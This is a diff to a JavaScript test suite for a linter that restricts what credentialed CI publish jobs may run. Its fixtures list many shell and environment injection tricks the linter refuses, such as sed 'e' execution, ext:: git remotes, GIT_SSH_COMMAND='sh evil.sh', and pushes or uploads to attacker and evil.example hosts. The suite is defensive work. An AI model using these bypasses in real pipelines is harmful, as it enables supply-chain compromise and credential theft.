@@ -46,6 +46,7 @@ const GOOD = `  pack-npm:
       - run: pnpm install --frozen-lockfile
   publish-npm:
     if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/')
+    runs-on: ubuntu-latest
     environment: sdk-publish-npm
     permissions:
       id-token: write
@@ -66,7 +67,8 @@ const run = (jobs, { s = settings(), m = manifest, extra = {}, head = HEAD } = {
 const fires = (got, re) => expect(got).toContainEqual(expect.stringMatching(re));
 const swap = (from, to) => {
   if (!GOOD.includes(from)) throw new Error(`fixture lacks ${from}`);
-  return GOOD.replace(from, to);
+  // A replacer function: `$'` and `$&` in a shell fixture are text, not patterns.
+  return GOOD.replace(from, () => to);
 };
 const UPLOAD = 'npm publish --ignore-scripts "./release/$ARTIFACT"';
 const PUBLISH_STEP = `      - run: ${UPLOAD}`;
@@ -97,7 +99,7 @@ const withMirrors = () => {
 const READS_SECRET = (name) =>
   GOOD.replace(
     "      - run: npm publish",
-    `      - env:\n          K: \${{ secrets.${name} }}\n        run: echo\n      - run: npm publish`,
+    `      - env:\n          DEPLOY_KEY: \${{ secrets.${name} }}\n        run: echo\n      - run: npm publish`,
   );
 
 describe("the real repository", () => {
@@ -165,7 +167,7 @@ describe("each rule fires on a fixture that breaks only it", () => {
     ["a shell script", "bash scripts/x.sh"],
     ["npm ci", "npm ci"],
   ])("3 a publish job that runs %s", (_, cmd) =>
-    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job runs/),
+    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job/),
   );
   it("3 a publish job's checkout that keeps its credential", () =>
     fires(
@@ -325,8 +327,8 @@ describe("each rule fires on a fixture that breaks only it", () => {
     "/abs/x.tgz",
     '"./x.tgz"',
     '--dry-run --access public "./x.tgz"',
-  ])("10 accepts npm publish %s", (arg) =>
-    expect(run(swap(UPLOAD, `npm publish --ignore-scripts ${arg}`))).toEqual([]),
+  ])("10 accepts npm publish %s (in the pack job's dry run)", (arg) =>
+    expect(run(swap(INSTALL_STEP, `      - run: npm publish --ignore-scripts ${arg}`))).toEqual([]),
   );
   it.each([
     "cargo build --release",
@@ -339,9 +341,7 @@ describe("each rule fires on a fixture that breaks only it", () => {
     "dart pub get",
     "python3 setup.py sdist",
     "rake release",
-  ])("3 a publish job running %s", (cmd) =>
-    fires(run(swap(UPLOAD, cmd)), /a credentialed job runs/),
-  );
+  ])("3 a publish job running %s", (cmd) => fires(run(swap(UPLOAD, cmd)), /a credentialed job/));
   it.each([
     'dotnet nuget push "./release/x.nupkg" --api-key "$K" --source https://api.nuget.org/v3/index.json',
     'gem push "./release/$ARTIFACT"',
@@ -349,10 +349,13 @@ describe("each rule fires on a fixture that breaks only it", () => {
     expect(run(swap(UPLOAD, cmd))).toEqual([]),
   );
   it.each([
-    ['cargo "+${RUST_VERSION}" publish --no-verify', "publish-crates"],
-    ["dart pub publish --force", "publish-pubdev"],
+    [
+      'cargo "+${RUST_VERSION}" publish --no-verify --manifest-path "${UNIT_PATH}/Cargo.toml"',
+      "publish-crates",
+    ],
+    ['dart pub publish --force --directory "${UNIT_PATH}"', "publish-pubdev"],
   ])("3 a source-only upload (%s) is allowed in %s only", (cmd, job) => {
-    const PROJECT = /a credentialed job runs/;
+    const PROJECT = /a credentialed job/;
     // In another publish job it is project code.
     fires(run(swap(UPLOAD, cmd)), PROJECT);
     // In its own job, and nowhere else, it is the recorded exception.
@@ -420,25 +423,11 @@ describe("each rule fires on a fixture that breaks only it", () => {
     "mvnw deploy",
     "mvn deploy",
   ])("3 a publish job running a JVM build (%s)", (cmd) =>
-    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job runs/),
-  );
-  it.each([
-    'aws s3api --endpoint-url "$endpoint" put-object --bucket "$MAVEN_BUCKET" --key "$1" --body "$1" --if-none-match \'*\'',
-    'sha256sum --check --strict --quiet "$RUNNER_TEMP/subjects.sha256"',
-    "curl --proto '=https' --tlsv1.2 -fsSI --retry 5 \"$MAVEN_URL/$pom\"",
-  ])("3 accepts the Maven upload command %s (#902)", (cmd) =>
-    expect(run(swap(PUBLISH_STEP, `      - run: ${cmd}`))).toEqual([]),
+    fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job/),
   );
   it.each(["bundle install", "bundle exec rake release", "(bundle exec rake)"])(
     "3 a publish job running bundler (%s)",
-    (cmd) => fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job runs/),
-  );
-  it.each([
-    'git bundle verify "$RUNNER_TEMP/release/php.bundle"',
-    'git fetch --quiet "$GITHUB_WORKSPACE/release/${UNIT_NAME}.bundle" refs/heads/main:refs/heads/main',
-    'git push --atomic "git@github.com:${MIRROR_REPOSITORY}.git" "${SPLIT_SHA}:refs/heads/main"',
-  ])("3 accepts the git command %s", (cmd) =>
-    expect(run(swap(PUBLISH_STEP, `      - run: ${cmd}`))).toEqual([]),
+    (cmd) => fires(run(swap(PUBLISH_STEP, `      - run: ${cmd}`)), /a credentialed job/),
   );
 
   it("11 control: a declared mirror and Go module tags are clean", () => {
@@ -531,6 +520,7 @@ const CLI = `on:
     tags: ["cli-v*"]
 jobs:
   upload:
+    runs-on: ubuntu-latest
     environment: cli-release
     steps:
       - uses: actions/checkout@${SHA}
@@ -538,6 +528,7 @@ jobs:
           persist-credentials: false
       - run: bash apps/cli/scripts/publish-r2.sh upload "\${TAG#cli-v}" dist
   promote:
+    runs-on: ubuntu-latest
     environment: cli-release
     steps:
       - run: bash apps/cli/scripts/publish-r2.sh promote "\${TAG#cli-v}"
@@ -549,7 +540,7 @@ const runCli = (cli = CLI, jobs = GOOD) =>
   run(jobs, {
     extra: { "cli-release.yml": parseYaml(cli), "cli-windows-install-verify.yml": VERIFY_CALLEE },
   });
-const RAN = /a credentialed job runs/;
+const RAN = /a credentialed job/;
 
 describe("rule 3 holds every job bound to an environment, not only a registry's (#794 review)", () => {
   it("control: cli-release's upload and promote, as recorded, are clean", () =>
@@ -649,16 +640,20 @@ describe("rule 3: caches that are on unless switched off (#794 review)", () => {
   });
 });
 
-describe("rule 3: a credentialed job runs only its allowlist (#794 review)", () => {
-  const inPublish = (cmd) =>
-    run(swap(PUBLISH_STEP, `      - run: |\n          ${cmd.replace(/\n/g, "\n          ")}`));
+describe("rule 3: a credentialed job runs only its grammar and allowlist (#794 review)", () => {
+  const block = (cmd) => `      - run: |\n          ${cmd.replace(/\n/g, "\n          ")}`;
+  const inPublish = (cmd, opts) => run(swap(PUBLISH_STEP, block(cmd)), opts);
+  const CRED = /a credentialed job/;
+  const PUSH = "git push --atomic --end-of-options";
   it.each([
+    // Rounds 1 and 2: the blocklist's bypasses.
     ["a backslash continuation", "pn\\\npm install"],
     ["a continuation inside npm's arguments", "npm \\\n  ci"],
     ["an option before npm's subcommand", "npm --prefix x ci"],
+    ["npm publish without --ignore-scripts", 'npm publish "./release/$ARTIFACT"'],
     [
-      "npm publish without --ignore-scripts (it runs the package's scripts)",
-      'npm publish "./release/$ARTIFACT"',
+      "npm publish --ignore-scripts=false",
+      'npm publish --ignore-scripts --ignore-scripts=false "./release/$ARTIFACT"',
     ],
     ["bunx", "bunx some-tool"],
     ["deno", "deno run x.ts"],
@@ -677,92 +672,321 @@ describe("rule 3: a credentialed job runs only its allowlist (#794 review)", () 
     ["exec", "exec python3 x.py"],
     ["env", "env FOO=1 bash x.sh"],
     ["xargs", "ls | xargs sh"],
-    ["find -exec", "find . -exec sh {} \\;"],
-    ["sort --compress-program", "sort --compress-program=sh x"],
-    ["sed's e flag", "sed 's/x/id/e' f"],
-    ["sed -e", "sed -e 's/x/y/' f"],
+    ["find -exec", "find . -exec sh {} \;"],
+    ["sort --compress-program", "sort --compress-program=sh"],
+    ["sed's e flag", "sed 's/x/id/e'"],
+    ["sed -e", "sed -e '1e id'"],
+    ["sed -f", "sed -f script.sed"],
+    ["a second sed script", "sed 's/a/b/' -e '1e id'"],
     ["git -c before the subcommand", "git -c core.sshCommand=sh push x"],
     ["git --upload-pack", "git fetch --upload-pack=sh x"],
-    ["git config (aliases and hooks run programs)", "git config alias.x '!sh'"],
-    ["a command inside a loop", "while read -r x; do python3 x; done < f"],
-    ["a command inside a case branch", 'case "$x" in a) python3 y ;; esac'],
-    ["a command inside a subshell", "(cd x && make)"],
-    ["a command inside a function", "f() { pnpm install; }; f"],
-    ["PATH set in the shell", 'export PATH="./bin:$PATH"'],
-    ["BASH_ENV as a prefix assignment", "BASH_ENV=x.sh echo hi"],
-    ["GIT_SSH_COMMAND that is not ssh", 'export GIT_SSH_COMMAND="sh evil.sh"'],
-    ["GIT_SSH_COMMAND with a ProxyCommand", 'export GIT_SSH_COMMAND="ssh -o ProxyCommand=x"'],
-    ["GIT_SSH_COMMAND with a config file", 'export GIT_SSH_COMMAND="ssh -F ssh_config"'],
+    ["git config", "git config alias.x '!sh'"],
+    ["a loop", "while read -r x; do python3 x; done < f"],
+    ["a case", 'case "$x" in a) python3 y ;; esac'],
+    ["a subshell", "(cd x && make)"],
+    ["a function", "f() { pnpm install; }; f"],
+    ["export", 'export PATH="./bin:$PATH"'],
+    ["a prefix assignment", "BASH_ENV=x.sh echo hi"],
+    ["an assignment", 'GIT_SSH_COMMAND="sh evil.sh"'],
     ["a write to GITHUB_PATH", 'echo "$PWD/bin" >> "$GITHUB_PATH"'],
-    ["a here-document", "cat <<EOF\n$(node x)\nEOF"],
+    // Round 3: arithmetic that bash runs as subshells, case closing a substitution.
+    ["((…)) read as arithmetic", "((node x.mjs) || (true))"],
+    ["$((…)) read as arithmetic", "x=$((cmd) || (x))"],
+    ["case after then", 'if true; then case "$x" in a) node x ;; esac; fi'],
+    ["case inside $( )", 'echo "$(case x in a) node y ;; esac)"'],
+    ["case in a group", "{ case x in a) node y;; esac; }"],
+    ["case after !", "! case x in a) y;; esac"],
+    ["case with in on the next line", "case x\nin a) node y;; esac"],
+    ["ANSI-C quoting", "echo $'\\'' ; node x # '"],
+    ['$"…" quoting', 'echo $"x"'],
+    ["a one-line function", "function f { pnpm install; }"],
+    ["function shadowing an earlier command", "node evil.mjs\nnode() { :; }"],
+    ["a function defined in a skipped branch", "false && python3() { :; }; python3 x.py"],
+    // Round 3: variables bound without NAME=.
+    ["local", "local PATH=x"],
+    ["read", "read PATH < x"],
+    ["printf -v", "printf -v PATH '%s' x"],
+    ["for … in", "for PATH in x; do :; done"],
+    ["for without in", "set -- a; for x do node evil.mjs; done"],
+    ["an arithmetic for", "for ((i=0;i<1;i++)) do node x; done"],
+    ["${…:=…}", ': "${PATH:=./bin}"'],
+    ["export without a value", "export PATH"],
+    ["export of an expansion", 'export "$N=x"'],
+    // Round 3: expansions bash evaluates as code.
+    ["an arithmetic subscript", "x='a[$(node evil.mjs)]'; echo \"$((x))\""],
+    ["a substring expansion", 'echo "${s:x}"'],
+    ["a funsub", 'echo "${ node x; }"'],
+    ["a valsub", 'echo "${| node x; }"'],
+    ["a substitution inside arithmetic", 'echo "$(( $(node x) ))"'],
+    ["indirect expansion", 'echo "${!X}"'],
+    // Round 3: options that reach a tool by other routes.
+    [
+      "an option through a variable",
+      `${PUSH} "$X" git@github.com:confeature/sdks.git HEAD:refs/heads/main`,
+    ],
+    ["an operand that starts with an expansion", 'git push --atomic "$X" HEAD:refs/heads/main'],
+    ["brace expansion", "git push --receive-pack={sh,x} x"],
+    ["a glob", "git push --receive-pack=s* x"],
+    [
+      "an abbreviated long option (git)",
+      `git push --receive-pa=sh --end-of-options git@github.com:confeature/sdks.git HEAD:refs/heads/main`,
+    ],
+    ["an abbreviated long option (sort)", "sort --compress-prog=sh"],
+    ["git init --template", "git init --template=publish-tmp/t publish-tmp/m.git"],
+    ["cd before an exception", 'cd apps && bash cli/scripts/publish-r2.sh promote "${TAG#cli-v}"'],
+    // Round 3: writes that change later steps.
+    ["GITHUB_ENV through a literal", "printf 'PATH=x' >> \"$GITHUB_ENV\""],
+    [
+      "the runner's file-command directory",
+      "echo x > publish-tmp/../../_temp/_runner_file_commands/set_env_1",
+    ],
+    ["RUNNER_TEMP", 'printf x > "$RUNNER_TEMP/x"'],
+    ["a write outside publish-tmp", "printf x > apps/cli/scripts/publish-r2.sh"],
+    ["rm outside publish-tmp", "rm -rf apps"],
+    ["mkdir outside publish-tmp", "mkdir -p apps/x"],
+    // Round 3: remote helpers and pinned destinations (security review).
+    ["an ext:: remote", "git push 'ext::sh -c touch% /tmp/x' main"],
+    ["an fd:: remote", "git fetch fd::3"],
+    ["an ext:: remote after end-of-options", `${PUSH} 'ext::sh -c x' HEAD:refs/heads/x`],
+    [
+      "a repository the settings do not name",
+      `${PUSH} git@github.com:attacker/x.git HEAD:refs/tags/x`,
+    ],
+    ["a forced refspec", `${PUSH} git@github.com:confeature/sdks.git +HEAD:refs/heads/main`],
+    ["a refspec that is an expansion", `${PUSH} git@github.com:confeature/sdks.git "$REF"`],
+    [
+      "dotnet --source elsewhere",
+      'dotnet nuget push "./x.nupkg" --api-key "$K" --source https://evil.example/v3/index.json',
+    ],
+    ["gem push --host", 'gem push --host https://evil.example "./x.gem"'],
+    ["curl -o", "curl -fsS -o x https://proxy.golang.org/x"],
+    ["curl -K", "curl -K cfg https://proxy.golang.org/x"],
+    ["curl to another host", "curl -fsS https://evil.example/x"],
+    [
+      "aws (only the reviewed Maven script uploads to R2)",
+      "aws s3api --endpoint-url https://evil.example put-object",
+    ],
+    ["rustup run", "rustup run stable node x"],
+    ["rustup with an expansion before --", 'rustup toolchain install "$X"'],
   ])("refuses %s", (_, cmd) => {
     const got = inPublish(cmd);
-    expect(got.length, `accepted: ${cmd}`).toBeGreaterThan(0);
     expect(
-      got.some((w) => /a credentialed job/.test(w)),
-      got.join("\n"),
+      got.some((w) => CRED.test(w)),
+      `accepted: ${cmd}\n${got.join("\n")}`,
     ).toBe(true);
   });
 
+  // Each row fails on its own check, not on a neighbour's.
+  it.each([
+    ["a here-document", "echo x <<echo\necho", /has a here-document/],
+    ["a backtick", "echo `echo`", /has a backtick/],
+    ["an unquoted $", "echo $X", /an unquoted \$/],
+    ["a glob", "ls release/*", /a glob character/],
+    ["a & background job", "echo x & echo y", /a & \(background/],
+    ["a subshell around an allowed command", "( echo hi )", /a \( \) or \{ \}/],
+    ["a group around an allowed command", "{ echo hi; }", /a \( \) or \{ \}/],
+    ["a backslash outside quotes", "echo a\\ b", /a backslash outside quotes/],
+    ["a substitution inside ${ }", 'echo "${X:-$(echo)}"', /\$\{ with \$/],
+    [
+      "a write outside publish-tmp",
+      "echo x > apps/cli/scripts/publish-r2.sh",
+      /writes only publish-tmp/,
+    ],
+    ["a .. in a redirection", "echo x > publish-tmp/../apps/x", /a literal path/],
+    [
+      "a git global option other than --git-dir",
+      "git --exec-path=x init --quiet --bare publish-tmp/m.git",
+      /global option/,
+    ],
+  ])("refuses %s, for that reason", (_, cmd, re) => fires(inPublish(cmd), re));
+
+  it("a folded run: > block is read as bash reads it, folded", () =>
+    fires(
+      run(swap(PUBLISH_STEP, "      - run: >\n          echo hi\n          && node x.mjs")),
+      /node is not a command/,
+    ));
+
   it.each([
     [
-      "a function, a case and a process substitution (publish-maven's shape)",
-      `type_of() {
-  case "$1" in
-    *.pom | "$base/"*.xml) echo "application/xml" ;;
-    *) echo "application/octet-stream" ;;
-  esac
-}
-s3() { aws s3api --endpoint-url "$endpoint" "$@"; }
-while IFS= read -r f; do echo "$(type_of "$f") $f"; done < <(find . -type f | sed 's|^\\./||') | sort -k1,1n > "$RUNNER_TEMP/order"
-if ! err="$(s3 get-object --key "$1" x 2>&1 >/dev/null)"; then echo "$err"; fi`,
+      "a single-file digest check",
+      `printf '%s  %s\\n' "$EXPECTED_SHA256" "release/$ARTIFACT" | sha256sum --check --strict`,
     ],
     [
-      "a deploy-key push (publish-go's shape)",
-      `umask 077
-printf '%s\\n' "$DEPLOY_KEY" > "$RUNNER_TEMP/ssh/key"
-export GIT_SSH_COMMAND="ssh -F /dev/null -i $RUNNER_TEMP/ssh/key -o StrictHostKeyChecking=yes"
-git push git@github.com:confeature/sdks.git "\${GITHUB_SHA}:refs/tags/\${RELEASE_TAG}"
-rm -rf "$RUNNER_TEMP/ssh"`,
+      "a file-set check, with an apostrophe in a message",
+      `mkdir -p publish-tmp
+ls -1 release | sort > publish-tmp/got-files
+printf '%s\\n' "$EXPECTED_SUMS" | cut -d ' ' -f 3- | sort > publish-tmp/want-files
+if cmp publish-tmp/got-files publish-tmp/want-files; then echo "the file set is the pack job's"; else echo "::error::it isn't"; exit 1; fi
+printf '%s\\n' "$EXPECTED_SUMS" | sed 's|  |  release/|' | sha256sum --check --strict`,
     ],
     [
-      "a digest check with an apostrophe in a double-quoted message",
-      `actual="$(sha256sum dist/SHA256SUMS | cut -d' ' -f1)"
-[ -n "$EXPECTED" ] && [ "$actual" = "$EXPECTED" ] ||
-  { echo "::error::digest $actual != release job's $EXPECTED"; exit 1; }`,
+      "a deploy key and a Go module tag push",
+      `if [ -z "$DEPLOY_KEY" ]; then echo "::error::no key"; exit 1; fi
+umask 077
+mkdir -p publish-tmp/ssh
+printf '%s\\n' "$DEPLOY_KEY" > publish-tmp/ssh/key
+${PUSH} git@github.com:confeature/sdks.git "HEAD:refs/tags/\${RELEASE_TAG}"
+rm -rf publish-tmp/ssh`,
     ],
-  ])("accepts %s", (_, script) => {
-    const block = script.replace(/\n/g, "\n          ");
-    expect(run(swap(PUBLISH_STEP, `      - run: |\n          ${block}`))).toEqual([]);
+    [
+      "a mirror received from its bundle",
+      `git init --quiet --bare publish-tmp/mirror.git
+git --git-dir=publish-tmp/mirror.git bundle verify --quiet --end-of-options release/mirror.bundle
+git --git-dir=publish-tmp/mirror.git fetch --quiet --end-of-options release/mirror.bundle refs/heads/main:refs/heads/main
+git --git-dir=publish-tmp/mirror.git rev-parse refs/heads/main > publish-tmp/got-split`,
+    ],
+    [
+      "the Go proxy warm-up",
+      `curl -fsS --proto '=https' --retry 5 --retry-delay 15 --retry-all-errors "https://proxy.golang.org/\${UNIT_COORDINATES}/@v/v\${UNIT_VERSION}.info"`,
+    ],
+    [
+      "the NuGet upload",
+      'dotnet nuget push "./release/x.nupkg" --api-key "$NUGET_API_KEY" --source https://api.nuget.org/v3/index.json',
+    ],
+  ])("accepts %s", (_, cmd) => expect(inPublish(cmd)).toEqual([]));
+
+  it("accepts a mirror push to the repository the settings name, and only there", () => {
+    const { m, s } = withMirrors();
+    const push = (repo) =>
+      inPublish(
+        `git --git-dir=publish-tmp/mirror.git ${PUSH.slice(4)} git@github.com:${repo}.git refs/heads/main:refs/heads/main "refs/heads/main:refs/tags/\${MIRROR_TAG}"`,
+        { m, s },
+      );
+    expect(push("o/p")).toEqual([]);
+    fires(push("o/other"), /the remote must be a literal URL/);
   });
 
   it("joins a backslash continuation the way bash does, so an exception still matches", () => {
     const own = swap("  publish-npm:\n", "  publish-crates:\n").replace(
       PUBLISH_STEP,
-      '      - run: |\n          cargo "+${RUST_VERSION}" publish \\\n            --no-verify',
+      '      - run: |\n          cargo "+${RUST_VERSION}" publish --no-verify \\\n            --manifest-path "${UNIT_PATH}/Cargo.toml"',
     );
-    expect(run(own).filter((w) => RAN.test(w))).toEqual([]);
+    expect(run(own).filter((w) => CRED.test(w))).toEqual([]);
+  });
+
+  const jobWith = (extra) =>
+    swap("    environment: sdk-publish-npm\n", `    environment: sdk-publish-npm\n${extra}`);
+  it.each([
+    [
+      "a step shell other than bash",
+      swap(PUBLISH_STEP, "      - shell: python {0}\n        run: echo hi"),
+      /shell other than plain bash/,
+    ],
+    [
+      "bash with extra arguments",
+      swap(PUBLISH_STEP, "      - shell: bash evil {0}\n        run: echo hi"),
+      /shell other than plain bash/,
+    ],
+    [
+      "bash -i --rcfile",
+      swap(PUBLISH_STEP, "      - shell: bash -i --rcfile x {0}\n        run: echo hi"),
+      /shell other than plain bash/,
+    ],
+    [
+      "a job defaults.run.shell",
+      jobWith("    defaults:\n      run:\n        shell: pwsh\n"),
+      /shell other than plain bash/,
+    ],
+    [
+      "a step working-directory",
+      swap(PUBLISH_STEP, "      - working-directory: apps\n        run: echo hi"),
+      /working-directory/,
+    ],
+    [
+      "a job defaults.run.working-directory",
+      jobWith("    defaults:\n      run:\n        working-directory: apps\n"),
+      /working-directory/,
+    ],
+    [
+      "a Windows runner",
+      GOOD.replace(
+        "    runs-on: ubuntu-latest\n    environment: sdk-publish-npm",
+        "    runs-on: windows-latest\n    environment: sdk-publish-npm",
+      ),
+      /ubuntu-\*/,
+    ],
+    ["a container", jobWith("    container: node:22\n"), /in a container/],
+    ["services", jobWith("    services:\n      db:\n        image: postgres\n"), /beside services/],
+    ["a job env: name off the allowlist", jobWith("    env:\n      PAGER: sh\n"), /sets PAGER/],
+    [
+      "GITHUB_ENV named anywhere",
+      swap(
+        PUBLISH_STEP,
+        "      - env:\n          ARTIFACT: ${{ env.GITHUB_ENV }}\n        run: echo hi",
+      ),
+      /names GITHUB_ENV/,
+    ],
+    [
+      "GITHUB_PATH named anywhere",
+      swap(PUBLISH_STEP, "      - env:\n          ARTIFACT: GITHUB_PATH\n        run: echo hi"),
+      /names GITHUB_ENV, GITHUB_PATH/,
+    ],
+    [
+      "download-artifact into the checkout",
+      swap(
+        PUBLISH_STEP,
+        `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          path: apps`,
+      ),
+      /release\/ or dist\/ only/,
+    ],
+    [
+      "a checkout path",
+      swap(
+        PUBLISH_STEP,
+        `      - uses: actions/checkout@${SHA}\n        with:\n          persist-credentials: false\n          path: x`,
+      ),
+      /takes no path/,
+    ],
+  ])("refuses %s", (_, jobs, re) => fires(run(jobs), re));
+
+  it("refuses a workflow defaults.run.shell or working-directory", () => {
+    fires(
+      run(GOOD, { head: `${HEAD}defaults:\n  run:\n    shell: sh\n` }),
+      /shell other than plain bash/,
+    );
+    fires(
+      run(GOOD, { head: `${HEAD}defaults:\n  run:\n    working-directory: apps\n` }),
+      /working-directory/,
+    );
   });
 
   it.each([
-    // `echo hi` is on the allowlist: only the shell makes it Python.
-    ["a step shell other than bash", `      - shell: python {0}\n        run: echo hi`],
-    ["BASH_ENV in a step's env:", `      - env:\n          BASH_ENV: ./x.sh\n        run: echo hi`],
-    [
-      "NODE_OPTIONS in a step's env:",
-      `      - env:\n          NODE_OPTIONS: --require ./x.js\n        run: echo hi`,
-    ],
-  ])("refuses %s", (_, step) => fires(run(swap(PUBLISH_STEP, step)), /credentialed job/));
-  it("refuses a credentialed job in a container", () =>
+    "DOTNET_STARTUP_HOOKS",
+    "RUBYGEMS_GEMDEPS",
+    "OPENSSL_CONF",
+    "OPENSSL_ENGINES",
+    "RUSTUP_DIST_SERVER",
+    "AWS_PAGER",
+    "PAGER",
+    "EDITOR",
+    "CARGO_REGISTRY_CREDENTIAL_PROVIDER",
+    "CARGO_REGISTRIES_X_CREDENTIAL_PROVIDER",
+    "CORECLR_PROFILER_PATH",
+    "BASH_ENV",
+    "NODE_OPTIONS",
+    "PATH",
+  ])("refuses %s in a step's, the job's or the workflow's env:", (name) => {
     fires(
-      run(
-        swap(
-          "    environment: sdk-publish-npm\n",
-          "    environment: sdk-publish-npm\n    container: node:22\n",
-        ),
-      ),
-      /in a container/,
-    ));
+      run(swap(PUBLISH_STEP, `      - env:\n          ${name}: x\n        run: echo hi`)),
+      new RegExp(`sets ${name}`),
+    );
+    fires(run(jobWith(`    env:\n      ${name}: x\n`)), new RegExp(`sets ${name}`));
+    fires(
+      run(GOOD, { head: HEAD.replace("env:\n", `env:\n  ${name}: x\n`) }),
+      new RegExp(`sets ${name}`),
+    );
+  });
+  it.each([
+    ["GIT_SSH_COMMAND that is not ssh", "GIT_SSH_COMMAND: sh evil.sh"],
+    ["GIT_SSH_COMMAND with a ProxyCommand", "GIT_SSH_COMMAND: ssh -o ProxyCommand=x"],
+    ["GIT_SSH_COMMAND with a config file", "GIT_SSH_COMMAND: ssh -F ssh_config"],
+    ["GIT_ALLOW_PROTOCOL with ext", "GIT_ALLOW_PROTOCOL: ssh:ext"],
+  ])("refuses %s", (_, kv) =>
+    fires(
+      run(swap(PUBLISH_STEP, `      - env:\n          ${kv}\n        run: echo hi`)),
+      /GIT_SSH_COMMAND must|GIT_ALLOW_PROTOCOL allows/,
+    ),
+  );
 });
 
 describe("rule 8 and rule 6: local, container and reusable-workflow references (#794 review)", () => {
@@ -848,6 +1072,15 @@ describe("§5: a credentialed job publishes this run's artifact, on a tag push o
     ["no if: at all", ""],
     ["no tag condition", "    if: github.event_name == 'push'\n"],
     ["no push condition", "    if: startsWith(github.ref, 'refs/tags/')\n"],
+    [
+      "a negated conjunct",
+      "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/') && !cancelled()\n",
+    ],
+    ["!=", "    if: github.event_name != 'pull_request' && startsWith(github.ref, 'refs/tags/')\n"],
+    [
+      "the conjuncts nested in parentheses",
+      "    if: always() && (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'))\n",
+    ],
     [
       "the condition ORed away",
       "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/') || always()\n",
